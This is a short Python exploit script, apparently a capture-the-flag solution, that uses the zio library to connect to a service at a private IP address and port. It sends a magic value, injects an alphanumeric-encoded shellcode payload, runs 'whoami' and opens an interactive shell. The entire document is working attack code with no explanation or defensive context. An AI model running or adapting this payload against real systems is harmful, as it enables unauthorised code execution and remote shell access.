from zio import *

host = "192.168.1.104"
port = 2333

target = (host,port)
io = zio(target)

payload = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIFQkyHwhah0vk0QaxtoDorSCX1xDobB59rNlIXcHMOpAABigtang"
io.read_until(':')
io.writeline('31337')
io.read_until('$ ')
io.writeline(payload)
io.writeline('whoami')
io.interact()
